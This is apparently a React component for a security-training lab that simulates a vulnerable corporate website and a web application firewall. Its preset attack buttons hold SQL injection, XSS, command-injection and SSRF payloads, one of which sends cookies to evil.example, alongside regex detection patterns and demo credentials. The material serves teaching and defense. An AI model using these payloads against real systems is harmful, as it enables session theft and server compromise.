// ============================================================================
// WebGuard — Web Lab: Multi-page realistic website simulation
// A convincing vulnerable website with real navigation, session state,
// and real-time attack/defend scenarios
// ============================================================================

import { useState, useCallback, useRef, useEffect, useMemo } from "react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { cn } from "@/lib/utils";
import { useWaf } from "../engine";
import { uid, shannonEntropy, randInt } from "../engine";
import type { HttpMethod, Severity, VulnFinding } from "../types";
import { SEVERITY_META } from "../types";
import {
  VULN_DEFS,
  SITE_TEMPLATES,
  type VulnId,
  type SiteTemplateId,
  type LabSiteConfig,
  runLabAttack,
  labResultToLog,
  labResultToFinding,
} from "../vulnLab";
import {
  AlertTriangle,
  ArrowLeft,
  Ban,
  BarChart3,
  Bell,
  BookOpen,
  Bug,
  Camera,
  ChevronDown,
  ChevronRight,
  ClipboardList,
  Copy,
  CreditCard,
  Eye,
  EyeOff,
  FileText,
  Globe2,
  Grid3X3,
  Home,
  Inbox,
  Key,
  LayoutDashboard,
  Lock,
  LogOut,
  Mail,
  MessageSquare,
  Minus,
  Phone,
  Play,
  Plus,
  RefreshCw,
  Search,
  Send,
  Server,
  Settings,
  Shield,
  ShieldCheck,
  ShieldOff,
  ShoppingCart,
  Smartphone,
  Terminal,
  TrendingUp,
  User,
  Users,
  X,
  Zap,
} from "lucide-react";

// ============================================================================
// Types
// ============================================================================

type SitePage =
  | "home"
  | "login"
  | "register"
  | "dashboard"
  | "search"
  | "contact"
  | "settings"
  | "profile"
  | "api-docs"
  | "admin";

interface WebLabProps {
  templateId: SiteTemplateId;
  enabledVulns: VulnId[];
  wafOn: boolean;
}

interface SiteAlert {
  id: string;
  type: "success" | "error" | "warning" | "info";
  title: string;
  detail: string;
  ts: number;
}

interface LogEntry {
  id: string;
  ts: number;
  type: "request" | "response" | "waf" | "error";
  method?: string;
  path?: string;
  status?: number;
  statusText?: string;
  headers?: Record<string, string>;
  body?: string;
  blocked?: boolean;
  vulnId?: VulnId;
  threatScore?: number;
}

// ============================================================================
// Fake user data for the simulated site
// ============================================================================

const FAKE_USERS = [
  { username: "admin", password: "admin123", name: "Admin User", role: "Administrator", email: "admin@acme-corp.com", avatar: "A" },
  { username: "john", password: "password", name: "John Smith", role: "Developer", email: "john@acme-corp.com", avatar: "J" },
  { username: "jane", password: "qwerty", name: "Jane Doe", role: "Manager", email: "jane@acme-corp.com", avatar: "J" },
];

const FAKE_SEARCH_RESULTS = [
  { title: "WebGuard WAF Documentation", url: "/docs/webguard", snippet: "Comprehensive guide to configuring WebGuard firewall rules and policies..." },
  { title: "Security Best Practices 2024", url: "/docs/security", snippet: "Top 10 security practices for web application deployment..." },
  { title: "API Rate Limiting Guide", url: "/docs/rate-limit", snippet: "How to configure rate limiting thresholds and bypass exceptions..." },
  { title: "Incident Response Playbook", url: "/docs/incident", snippet: "Step-by-step incident response procedures for security breaches..." },
  { title: "Vulnerability Assessment Report", url: "/reports/vuln", snippet: "Latest vulnerability assessment results and remediation steps..." },
];

// ============================================================================
// Simulated Website Pages
// ============================================================================

function SiteHome({ onNavigate, enabledVulns }: { onNavigate: (p: SitePage) => void; enabledVulns: VulnId[] }) {
  return (
    <div className="space-y-6">
      {/* Hero */}
      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-br from-cyan-600 via-blue-600 to-violet-600 p-8 text-white">
        <div className="relative z-10">
          <h1 className="text-2xl font-bold">Welcome to Acme Corp</h1>
          <p className="mt-2 max-w-md text-sm text-white/80">
            Enterprise security platform — protecting your digital assets with AI-powered threat detection.
          </p>
          <div className="mt-4 flex gap-3">
            <button onClick={() => onNavigate("login")} className="rounded-lg bg-white/20 px-4 py-2 text-xs font-semibold backdrop-blur-sm transition hover:bg-white/30">
              Sign In →
            </button>
            <button onClick={() => onNavigate("search")} className="rounded-lg border border-white/30 px-4 py-2 text-xs font-semibold transition hover:bg-white/10">
              Explore Docs
            </button>
          </div>
        </div>
        <div className="absolute -right-8 -top-8 size-40 rounded-full bg-white/5" />
        <div className="absolute -bottom-6 -right-6 size-32 rounded-full bg-white/5" />
      </div>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-3">
        {[
          { label: "Uptime", value: "99.97%", icon: <TrendingUp className="size-4 text-emerald-400" /> },
          { label: "Threats Blocked", value: "14,291", icon: <Shield className="size-4 text-cyan-400" /> },
          { label: "Active Users", value: "2,847", icon: <Users className="size-4 text-violet-400" /> },
        ].map((s) => (
          <div key={s.label} className="rounded-xl border border-border/40 bg-card/50 p-3">
            <div className="flex items-center gap-2">
              {s.icon}
              <span className="text-[10px] text-muted-foreground">{s.label}</span>
            </div>
            <p className="mt-1 font-mono text-lg font-bold text-foreground">{s.value}</p>
          </div>
        ))}
      </div>

      {/* Quick links */}
      <div className="grid grid-cols-2 gap-3">
        {[
          { page: "search" as SitePage, label: "Knowledge Base", desc: "Search documentation and guides", icon: <Search className="size-4 text-cyan-400" /> },
          { page: "api-docs" as SitePage, label: "API Reference", desc: "REST API endpoints and auth", icon: <Terminal className="size-4 text-emerald-400" /> },
          { page: "contact" as SitePage, label: "Contact Support", desc: "Reach our security team", icon: <Mail className="size-4 text-amber-400" /> },
          { page: "settings" as SitePage, label: "Account Settings", desc: "Manage your profile", icon: <Settings className="size-4 text-violet-400" /> },
        ].map((l) => (
          <button key={l.page} onClick={() => onNavigate(l.page)} className="flex items-start gap-3 rounded-xl border border-border/40 bg-card/50 p-3 text-left transition-colors hover:border-cyan-500/30 hover:bg-cyan-500/5">
            <div className="flex size-8 shrink-0 items-center justify-center rounded-lg bg-muted/50">{l.icon}</div>
            <div>
              <p className="text-xs font-semibold text-foreground">{l.label}</p>
              <p className="text-[10px] text-muted-foreground">{l.desc}</p>
            </div>
          </button>
        ))}
      </div>

      {/* Vulnerable section notices */}
      {enabledVulns.length > 0 && (
        <div className="rounded-xl border border-amber-500/20 bg-amber-500/5 p-3">
          <p className="text-[10px] font-bold uppercase tracking-wider text-amber-500">⚠ Security Notices</p>
          <div className="mt-1.5 space-y-1">
            {enabledVulns.includes("reflected-xss") && <p className="text-[10px] text-muted-foreground">• Search functionality reflects user input without encoding</p>}
            {enabledVulns.includes("sqli-login") && <p className="text-[10px] text-muted-foreground">• Login form uses raw SQL concatenation</p>}
            {enabledVulns.includes("stored-xss") && <p className="text-[10px] text-muted-foreground">• Contact form submissions are rendered unsanitized</p>}
            {enabledVulns.includes("idor") && <p className="text-[10px] text-muted-foreground">• User profiles use sequential IDs without auth checks</p>}
          </div>
        </div>
      )}
    </div>
  );
}

function SiteLogin({ onNavigate, onLogin, enabledVulns, siteAlert }: {
  onNavigate: (p: SitePage) => void;
  onLogin: (user: typeof FAKE_USERS[0]) => void;
  enabledVulns: VulnId[];
  siteAlert: SiteAlert | null;
}) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = () => {
    setLoading(true);
    setTimeout(() => {
      const user = FAKE_USERS.find((u) => u.username === username && u.password === password);
      if (user) {
        onLogin(user);
        toast.success("Login successful");
      } else {
        toast.error("Invalid credentials");
      }
      setLoading(false);
    }, 600);
  };

  return (
    <div className="mx-auto max-w-sm space-y-5 py-6">
      <div className="text-center">
        <div className="mx-auto mb-3 flex size-14 items-center justify-center rounded-2xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20">
          <Key className="size-7 text-cyan-400" />
        </div>
        <h2 className="text-lg font-bold text-foreground">Sign In</h2>
        <p className="mt-1 text-xs text-muted-foreground">Enter your Acme Corp credentials</p>
      </div>

      {siteAlert && (
        <div className={cn("rounded-lg border px-3 py-2 text-[10px]", siteAlert.type === "error" ? "border-red-500/30 bg-red-500/10 text-red-400" : siteAlert.type === "success" ? "border-emerald-500/30 bg-emerald-500/10 text-emerald-400" : "border-amber-500/30 bg-amber-500/10 text-amber-400")}>
          <p className="font-semibold">{siteAlert.title}</p>
          <p className="mt-0.5 text-muted-foreground">{siteAlert.detail}</p>
        </div>
      )}

      <div className="space-y-3">
        <div>
          <label className="mb-1 block text-[10px] font-semibold text-foreground/70">Username</label>
          <div className="relative">
            <User className="absolute left-2.5 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground" />
            <Input value={username} onChange={(e) => setUsername(e.target.value)} placeholder="admin" className="h-9 border-border/50 bg-background/80 pl-8 font-mono text-xs" spellCheck={false} />
            {enabledVulns.includes("sqli-login") && <span className="absolute right-2 top-1/2 -translate-y-1/2 rounded bg-red-500/10 px-1 py-0.5 text-[7px] font-bold text-red-400">VULN</span>}
          </div>
        </div>
        <div>
          <label className="mb-1 block text-[10px] font-semibold text-foreground/70">Password</label>
          <div className="relative">
            <Lock className="absolute left-2.5 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground" />
            <Input value={password} onChange={(e) => setPassword(e.target.value)} type={showPw ? "text" : "password"} placeholder="••••••••" className="h-9 border-border/50 bg-background/80 pl-8 pr-9 font-mono text-xs" spellCheck={false} />
            <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
              {showPw ? <EyeOff className="size-3.5" /> : <Eye className="size-3.5" />}
            </button>
            {enabledVulns.includes("sqli-login") && <span className="absolute right-8 top-1/2 -translate-y-1/2 rounded bg-red-500/10 px-1 py-0.5 text-[7px] font-bold text-red-400">VULN</span>}
          </div>
        </div>
        <Button onClick={handleSubmit} disabled={loading || (!username && !password)} className="h-10 w-full gap-2 rounded-xl text-xs font-bold">
          {loading ? <span className="size-3.5 animate-spin rounded-full border-2 border-white/30 border-t-white" /> : <Key className="size-3.5" />}
          {loading ? "Authenticating..." : "Sign In"}
        </Button>
      </div>

      <div className="space-y-2 text-center text-[10px] text-muted-foreground">
        <p>
          <button onClick={() => onNavigate("register")} className="text-cyan-400 hover:underline">Create account</button>
          {" · "}
          <span className="text-cyan-400 hover:underline cursor-pointer">Forgot password?</span>
        </p>
        <p className="text-muted-foreground/60">
          Demo: admin/admin123 · john/password · jane/qwerty
        </p>
      </div>

      {/* Quick attack buttons */}
      {enabledVulns.includes("sqli-login") && (
        <div className="rounded-xl border border-red-500/20 bg-red-500/5 p-3">
          <p className="mb-1.5 text-[9px] font-bold uppercase tracking-wider text-red-400">Quick Attacks</p>
          <div className="flex flex-wrap gap-1.5">
            {["admin'--", "' OR '1'='1'--", "admin'/*&password=*/OR'1'='1"].map((p) => (
              <button key={p} onClick={() => { setUsername(p); setPassword("x"); }} className="rounded-md border border-red-500/20 bg-red-500/5 px-2 py-0.5 font-mono text-[9px] text-red-400 transition hover:bg-red-500/10">{p}</button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function SiteDashboard({ user, onNavigate }: { user: typeof FAKE_USERS[0]; onNavigate: (p: SitePage) => void }) {
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-3">
        <div className="flex size-10 items-center justify-center rounded-full bg-gradient-to-br from-cyan-500 to-blue-600 text-sm font-bold text-white">{user.avatar}</div>
        <div>
          <p className="text-sm font-bold text-foreground">Welcome back, {user.name}</p>
          <p className="text-[10px] text-muted-foreground">{user.role} · {user.email}</p>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-3">
        {[
          { label: "Security Score", value: "87/100", color: "text-emerald-400", bg: "from-emerald-500/10 to-emerald-500/5" },
          { label: "Active Sessions", value: "3", color: "text-cyan-400", bg: "from-cyan-500/10 to-cyan-500/5" },
          { label: "API Calls (24h)", value: "12,847", color: "text-violet-400", bg: "from-violet-500/10 to-violet-500/5" },
          { label: "Threats Blocked", value: "291", color: "text-amber-400", bg: "from-amber-500/10 to-amber-500/5" },
        ].map((s) => (
          <div key={s.label} className={cn("rounded-xl bg-gradient-to-br p-3", s.bg)}>
            <p className="text-[10px] text-muted-foreground">{s.label}</p>
            <p className={cn("mt-1 font-mono text-lg font-bold", s.color)}>{s.value}</p>
          </div>
        ))}
      </div>

      {/* Recent activity */}
      <div className="rounded-xl border border-border/40 bg-card/50 p-3">
        <p className="mb-2 text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Recent Activity</p>
        <div className="space-y-2">
          {[
            { time: "2 min ago", action: "Login from 192.168.1.42", icon: <Key className="size-3 text-emerald-400" /> },
            { time: "15 min ago", action: "API key rotated", icon: <Zap className="size-3 text-cyan-400" /> },
            { time: "1 hr ago", action: "Firewall rule updated", icon: <Shield className="size-3 text-violet-400" /> },
            { time: "3 hrs ago", action: "Backup completed", icon: <Server className="size-3 text-amber-400" /> },
          ].map((a, i) => (
            <div key={i} className="flex items-center gap-2 text-[10px]">
              <span className="flex size-5 shrink-0 items-center justify-center rounded bg-muted/50">{a.icon}</span>
              <span className="flex-1 text-foreground/80">{a.action}</span>
              <span className="text-muted-foreground">{a.time}</span>
            </div>
          ))}
        </div>
      </div>

      <div className="grid grid-cols-2 gap-2">
        <button onClick={() => onNavigate("settings")} className="rounded-xl border border-border/40 bg-card/50 p-3 text-left transition hover:border-cyan-500/30">
          <Settings className="mb-1 size-4 text-muted-foreground" />
          <p className="text-[10px] font-semibold text-foreground">Settings</p>
        </button>
        <button onClick={() => onNavigate("api-docs")} className="rounded-xl border border-border/40 bg-card/50 p-3 text-left transition hover:border-cyan-500/30">
          <Terminal className="mb-1 size-4 text-muted-foreground" />
          <p className="text-[10px] font-semibold text-foreground">API Docs</p>
        </button>
      </div>
    </div>
  );
}

function SiteSearch({ enabledVulns, onAttack }: { enabledVulns: VulnId[]; onAttack: (payload: string, field: string, method: HttpMethod, path: string) => void }) {
  const [query, setQuery] = useState("");
  const [results, setResults] = useState<typeof FAKE_SEARCH_RESULTS>([]);
  const [searched, setSearched] = useState(false);

  const handleSearch = () => {
    if (!query.trim()) return;
    setSearched(true);
    // Check if query looks like an attack payload
    const hasPayload = /<script|union\s+select|or\s+1=1|'\s*--|onerror|onload/i.test(query);
    if (hasPayload) {
      onAttack(`q=${query}`, "q", "GET", `/search?q=${encodeURIComponent(query)}`);
    } else {
      setResults(FAKE_SEARCH_RESULTS.filter((r) => r.title.toLowerCase().includes(query.toLowerCase()) || r.snippet.toLowerCase().includes(query.toLowerCase())));
    }
  };

  return (
    <div className="space-y-4">
      <div className="text-center">
        <h2 className="text-lg font-bold text-foreground">Knowledge Base</h2>
        <p className="mt-1 text-[10px] text-muted-foreground">Search across 2.4M records</p>
      </div>

      <div className="relative">
        <Search className="absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
        <Input value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search documentation..." className="h-10 border-border/50 bg-background/80 pl-10 font-mono text-xs" spellCheck={false} onKeyDown={(e) => e.key === "Enter" && handleSearch()} />
        {enabledVulns.includes("reflected-xss") && <span className="absolute right-3 top-1/2 -translate-y-1/2 rounded bg-red-500/10 px-1.5 py-0.5 text-[7px] font-bold text-red-400">XSS VULN</span>}
      </div>

      <Button onClick={handleSearch} className="h-9 w-full gap-1.5 text-xs font-bold"><Search className="size-3.5" /> Search</Button>

      {searched && results.length > 0 && (
        <div className="space-y-2">
          <p className="text-[10px] text-muted-foreground">{results.length} results for "{query}"</p>
          {results.map((r, i) => (
            <div key={i} className="rounded-xl border border-border/40 bg-card/50 p-3 transition-colors hover:border-cyan-500/20">
              <p className="text-xs font-semibold text-cyan-400">{r.title}</p>
              <p className="mt-0.5 font-mono text-[9px] text-muted-foreground">{r.url}</p>
              <p className="mt-1 text-[10px] text-muted-foreground/80">{r.snippet}</p>
            </div>
          ))}
        </div>
      )}
      {searched && results.length === 0 && (
        <p className="text-center text-xs text-muted-foreground">No results found for "{query}"</p>
      )}

      {enabledVulns.includes("reflected-xss") && (
        <div className="rounded-xl border border-red-500/20 bg-red-500/5 p-3">
          <p className="mb-1 text-[9px] font-bold uppercase tracking-wider text-red-400">Quick XSS Attacks</p>
          <div className="flex flex-wrap gap-1.5">
            {['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(document.domain)>'].map((p) => (
              <button key={p} onClick={() => setQuery(p)} className="rounded-md border border-red-500/20 bg-red-500/5 px-2 py-0.5 font-mono text-[8px] text-red-400 transition hover:bg-red-500/10">{p.slice(0, 30)}{p.length > 30 ? "..." : ""}</button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function SiteContact({ enabledVulns, onAttack }: { enabledVulns: VulnId[]; onAttack: (payload: string, field: string, method: HttpMethod, path: string) => void }) {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [message, setMessage] = useState("");
  const [sent, setSent] = useState(false);

  const handleSend = () => {
    const hasPayload = /<script|onerror|onload|<img|<svg|%0[AD]/i.test(name + email + message);
    if (hasPayload) {
      const payload = `name=${name}&email=${email}&message=${message}`;
      onAttack(payload, "name", "POST", "/api/contact");
    } else {
      setSent(true);
      toast.success("Message sent!");
    }
  };

  return (
    <div className="space-y-4">
      <div className="text-center">
        <h2 className="text-lg font-bold text-foreground">Contact Us</h2>
        <p className="mt-1 text-[10px] text-muted-foreground">Get in touch with our security team</p>
      </div>

      {sent ? (
        <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/5 p-6 text-center">
          <div className="mx-auto mb-2 flex size-10 items-center justify-center rounded-full bg-emerald-500/10"><Send className="size-5 text-emerald-400" /></div>
          <p className="text-sm font-semibold text-emerald-400">Message Sent!</p>
          <p className="mt-1 text-[10px] text-muted-foreground">We'll get back to you within 24 hours.</p>
        </div>
      ) : (
        <div className="space-y-3">
          <div>
            <label className="mb-1 block text-[10px] font-semibold text-foreground/70">Name</label>
            <Input value={name} onChange={(e) => setName(e.target.value)} placeholder="John Doe" className="h-9 border-border/50 bg-background/80 font-mono text-xs" spellCheck={false} />
            {enabledVulns.includes("stored-xss") && <span className="text-[7px] text-red-400">⚠ Vulnerable to Stored XSS</span>}
          </div>
          <div>
            <label className="mb-1 block text-[10px] font-semibold text-foreground/70">Email</label>
            <Input value={email} onChange={(e) => setEmail(e.target.value)} type="email" placeholder="john@example.com" className="h-9 border-border/50 bg-background/80 font-mono text-xs" spellCheck={false} />
            {enabledVulns.includes("email-injection") && <span className="text-[7px] text-red-400">⚠ Vulnerable to Email Injection</span>}
          </div>
          <div>
            <label className="mb-1 block text-[10px] font-semibold text-foreground/70">Message</label>
            <Textarea value={message} onChange={(e) => setMessage(e.target.value)} placeholder="Your message..." className="min-h-20 resize-none border-border/50 bg-background/80 font-mono text-xs" spellCheck={false} />
          </div>
          <Button onClick={handleSend} className="h-9 w-full gap-1.5 text-xs font-bold"><Send className="size-3.5" /> Send Message</Button>
        </div>
      )}

      {enabledVulns.includes("stored-xss") && (
        <div className="rounded-xl border border-red-500/20 bg-red-500/5 p-3">
          <p className="mb-1 text-[9px] font-bold uppercase tracking-wider text-red-400">Quick XSS Attacks</p>
          <div className="flex flex-wrap gap-1.5">
            {['<script>alert("XSS")</script>', '<img src=x onerror=alert(1)>', '</title><script>fetch("//evil.example/"+document.cookie)</script>'].map((p) => (
              <button key={p} onClick={() => setName(p)} className="rounded-md border border-red-500/20 bg-red-500/5 px-2 py-0.5 font-mono text-[8px] text-red-400 transition hover:bg-red-500/10">{p.slice(0, 35)}{p.length > 35 ? "..." : ""}</button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function SiteSettings({ user, enabledVulns, onAttack }: { user: typeof FAKE_USERS[0]; enabledVulns: VulnId[]; onAttack: (payload: string, field: string, method: HttpMethod, path: string) => void }) {
  const [userId, setUserId] = useState("1");
  const [name, setName] = useState(user.name);
  const [email, setEmail] = useState(user.email);

  const handleFetch = () => {
    if (enabledVulns.includes("idor")) {
      onAttack(`id=${userId}`, "id", "GET", `/api/users/${userId}`);
    }
  };

  return (
    <div className="space-y-4">
      <h2 className="text-sm font-bold text-foreground">Account Settings</h2>

      <div className="rounded-xl border border-border/40 bg-card/50 p-3 space-y-3">
        <div>
          <label className="mb-1 block text-[10px] font-semibold text-foreground/70">Display Name</label>
          <Input value={name} onChange={(e) => setName(e.target.value)} className="h-9 border-border/50 bg-background/80 text-xs" />
        </div>
        <div>
          <label className="mb-1 block text-[10px] font-semibold text-foreground/70">Email</label>
          <Input value={email} onChange={(e) => setEmail(e.target.value)} className="h-9 border-border/50 bg-background/80 text-xs" />
        </div>
        <Button className="h-9 w-full gap-1.5 text-xs font-bold">Save Changes</Button>
      </div>

      {enabledVulns.includes("idor") && (
        <div className="rounded-xl border border-red-500/20 bg-red-500/5 p-3 space-y-2">
          <p className="text-[9px] font-bold uppercase tracking-wider text-red-400">IDOR Attack — User Enumeration</p>
          <p className="text-[10px] text-muted-foreground">Change the User ID to access other users' profiles.</p>
          <div className="flex gap-2">
            <Input value={userId} onChange={(e) => setUserId(e.target.value)} className="h-8 w-20 border-border/50 bg-background/80 font-mono text-xs" placeholder="ID" />
            <Button size="sm" onClick={handleFetch} variant="outline" className="h-8 gap-1 text-[10px]"><Play className="size-3" /> Fetch</Button>
          </div>
          <div className="flex flex-wrap gap-1">
            {["1", "2", "3", "42", "1337"].map((id) => (
              <button key={id} onClick={() => { setUserId(id); setTimeout(() => onAttack(`id=${id}`, "id", "GET", `/api/users/${id}`), 100); }} className="rounded-md border border-red-500/20 bg-red-500/5 px-2 py-0.5 font-mono text-[9px] text-red-400 hover:bg-red-500/10">ID: {id}</button>
            ))}
          </div>
        </div>
      )}

      {enabledVulns.includes("cmdi") && (
        <div className="rounded-xl border border-red-500/20 bg-red-500/5 p-3 space-y-2">
          <p className="text-[9px] font-bold uppercase tracking-wider text-red-400">Command Injection</p>
          <p className="text-[10px] text-muted-foreground">The server health check endpoint executes shell commands.</p>
          <div className="flex flex-wrap gap-1">
            {["8.8.8.8;cat /etc/passwd", "`id`", "127.0.0.1|whoami"].map((p) => (
              <button key={p} onClick={() => onAttack(`host=${p}`, "host", "POST", "/api/ping")} className="rounded-md border border-red-500/20 bg-red-500/5 px-2 py-0.5 font-mono text-[8px] text-red-400 hover:bg-red-500/10">{p.slice(0, 25)}</button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function SiteApiDocs({ enabledVulns, onAttack }: { enabledVulns: VulnId[]; onAttack: (payload: string, field: string, method: HttpMethod, path: string) => void }) {
  const [endpoint, setEndpoint] = useState("/api/users");
  const [param, setParam] = useState("1");
  const [response, setResponse] = useState<string | null>(null);

  const tryEndpoint = () => {
    if (enabledVulns.includes("sqli-api")) {
      onAttack(`id=${param}`, "id", "GET", `${endpoint}?id=${param}`);
    }
    if (enabledVulns.includes("ssrf")) {
      onAttack(`callback=${param}`, "callback", "POST", "/api/webhook");
    }
  };

  const endpoints = [
    { method: "GET", path: "/api/users/:id", desc: "Get user by ID", vuln: "idor" },
    { method: "GET", path: "/api/users", desc: "List all users", vuln: null },
    { method: "POST", path: "/api/webhook", desc: "Register webhook callback", vuln: "ssrf" },
    { method: "GET", path: "/api/health", desc: "Server health check", vuln: "cmdi" },
  ];

  return (
    <div className="space-y-4">
      <h2 className="text-sm font-bold text-foreground">API Reference</h2>

      <div className="space-y-2">
        {endpoints.map((ep, i) => {
          const hasVuln = ep.vuln && enabledVulns.includes(ep.vuln as VulnId);
          return (
            <div key={i} className={cn("rounded-xl border bg-card/50 p-3 transition-colors", hasVuln ? "border-red-500/30" : "border-border/40")}>
              <div className="flex items-center gap-2">
                <span className={cn("rounded px-1.5 py-0.5 text-[8px] font-bold", ep.method === "GET" ? "bg-emerald-500/15 text-emerald-400" : "bg-amber-500/15 text-amber-400")}>{ep.method}</span>
                <span className="font-mono text-[10px] text-foreground">{ep.path}</span>
                {hasVuln && <span className="ml-auto rounded bg-red-500/10 px-1 py-0.5 text-[7px] font-bold text-red-400">VULN</span>}
              </div>
              <p className="mt-1 text-[10px] text-muted-foreground">{ep.desc}</p>
            </div>
          );
        })}
      </div>

      {(enabledVulns.includes("sqli-api") || enabledVulns.includes("ssrf")) && (
        <div className="rounded-xl border border-red-500/20 bg-red-500/5 p-3 space-y-2">
          <p className="text-[9px] font-bold uppercase tracking-wider text-red-400">Test API Attack</p>
          <div className="flex gap-2">
            <Input value={param} onChange={(e) => setParam(e.target.value)} placeholder="Payload" className="h-8 flex-1 border-border/50 bg-background/80 font-mono text-xs" />
            <Button size="sm" onClick={tryEndpoint} variant="outline" className="h-8 gap-1 text-[10px]"><Play className="size-3" /> Try</Button>
          </div>
          <div className="flex flex-wrap gap-1">
            {["1' OR '1'='1", "1 UNION SELECT NULL,NULL,NULL--", "http://169.254.169.254/latest/meta-data/"].map((p) => (
              <button key={p} onClick={() => setParam(p)} className="rounded-md border border-red-500/20 bg-red-500/5 px-2 py-0.5 font-mono text-[8px] text-red-400 hover:bg-red-500/10">{p.slice(0, 35)}{p.length > 35 ? "..." : ""}</button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function SiteProfile({ user }: { user: typeof FAKE_USERS[0] }) {
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-3">
        <div className="flex size-12 items-center justify-center rounded-full bg-gradient-to-br from-cyan-500 to-blue-600 text-lg font-bold text-white">{user.avatar}</div>
        <div>
          <p className="text-sm font-bold text-foreground">{user.name}</p>
          <p className="text-[10px] text-muted-foreground">{user.role} · ID: {randInt(1, 999)}</p>
        </div>
      </div>
      <div className="rounded-xl border border-border/40 bg-card/50 p-3 space-y-2">
        {[
          { label: "Email", value: user.email },
          { label: "Role", value: user.role },
          { label: "Department", value: "Engineering" },
          { label: "Last Login", value: new Date().toLocaleString() },
          { label: "2FA", value: "Enabled" },
        ].map((f) => (
          <div key={f.label} className="flex items-center justify-between text-[10px]">
            <span className="text-muted-foreground">{f.label}</span>
            <span className="font-medium text-foreground">{f.value}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ============================================================================
// Main WebLabTab Component
// ============================================================================

export function WebLabTab({ templateId, enabledVulns, wafOn }: WebLabProps) {
  const { dispatch } = useWaf();

  // Simulated site state
  const [sitePage, setSitePage] = useState<SitePage>("home");
  const [siteUser, setSiteUser] = useState<typeof FAKE_USERS[0] | null>(null);
  const [siteAlert, setSiteAlert] = useState<SiteAlert | null>(null);
  const [navigating, setNavigating] = useState(false);

  // Attack/session state
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [lastResult, setLastResult] = useState<LogEntry | null>(null);
  const [attackEffect, setAttackEffect] = useState<"exploit" | "blocked" | null>(null);
  const [showRawHttp, setShowRawHttp] = useState<string | null>(null);
  const [responseTab, setResponseTab] = useState<"visual" | "http" | "analysis">("visual");

  const logsEndRef = useRef<HTMLDivElement>(null);

  // Page navigation with loading animation
  const navigateTo = useCallback((page: SitePage) => {
    if (page === sitePage) return;
    setNavigating(true);
    setSiteAlert(null);
    setTimeout(() => {
      setSitePage(page);
      setNavigating(false);
    }, 200 + Math.random() * 200);
  }, [sitePage]);

  // Login handler
  const handleLogin = useCallback((user: typeof FAKE_USERS[0]) => {
    setSiteUser(user);
    navigateTo("dashboard");
  }, [navigateTo]);

  // Logout
  const handleLogout = useCallback(() => {
    setSiteUser(null);
    navigateTo("home");
  }, [navigateTo]);

  // Attack handler — runs the lab engine and shows results
  const handleAttack = useCallback((payload: string, field: string, method: HttpMethod, path: string) => {
    const config: LabSiteConfig = {
      templateId,
      enabledVulns,
      customVulnName: "",
      customVulnPayload: "",
      customVulnSeverity: "medium",
      fieldValues: { [field]: payload },
    };

    const result = runLabAttack(config, payload, method, path, wafOn);

    // Build log entry
    const reqHeaders: Record<string, string> = {
      Host: "vulnerable-app.local",
      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
      Accept: "text/html,application/xhtml+xml",
    };
    if (method === "POST") reqHeaders["Content-Type"] = "application/x-www-form-urlencoded";

    const reqLog: LogEntry = {
      id: uid("LOG"),
      ts: Date.now(),
      type: "request",
      method,
      path,
      headers: reqHeaders,
      body: payload,
    };

    const resLog: LogEntry = {
      id: uid("LOG"),
      ts: Date.now() + 100,
      type: result.blocked ? "waf" : "response",
      status: result.response.status,
      statusText: result.blocked ? "Forbidden" : result.response.status === 200 ? "OK" : "Error",
      headers: result.blocked
        ? { "X-WebGuard-Rule": result.vulnId ?? "CUSTOM", "X-WebGuard-Action": "blocked" }
        : { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
      body: result.response.body,
      blocked: result.blocked,
      vulnId: result.vulnId,
      threatScore: result.threatScore,
    };

    setLogs((prev) => [...prev, reqLog, resLog]);
    setLastResult(resLog);

    // Visual effects
    if (result.blocked) {
      setAttackEffect("blocked");
      setSiteAlert({ id: uid("ALT"), type: "warning", title: "🛡️ Request Blocked by WebGuard", detail: `${VULN_DEFS[result.vulnId]?.label ?? "Attack"} intercepted — 403 Forbidden at the edge`, ts: Date.now() });
      toast.success("Attack BLOCKED", { description: `${VULN_DEFS[result.vulnId]?.label} — 403` });
    } else {
      setAttackEffect("exploit");
      setSiteAlert({ id: uid("ALT"), type: "error", title: "⚠️ Vulnerability EXPLOITED!", detail: `${VULN_DEFS[result.vulnId]?.label ?? "Attack"} succeeded — ${result.response.status}`, ts: Date.now() });
      toast.error("Exploited!", { description: `${VULN_DEFS[result.vulnId]?.label} — ${result.response.status}` });
    }
    setTimeout(() => setAttackEffect(null), 2000);

    // Dispatch to SOC
    dispatch({ type: "INJECT_LOG", log: labResultToLog(result) });
    if (!result.blocked && result.vulnId && result.vulnId !== "custom") {
      dispatch({ type: "ADD_FINDING", finding: labResultToFinding(result) as VulnFinding });
    }
  }, [templateId, enabledVulns, wafOn, dispatch]);

  // Auto-scroll logs
  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  // Stats
  const totalReqs = logs.filter((l) => l.type === "request").length;
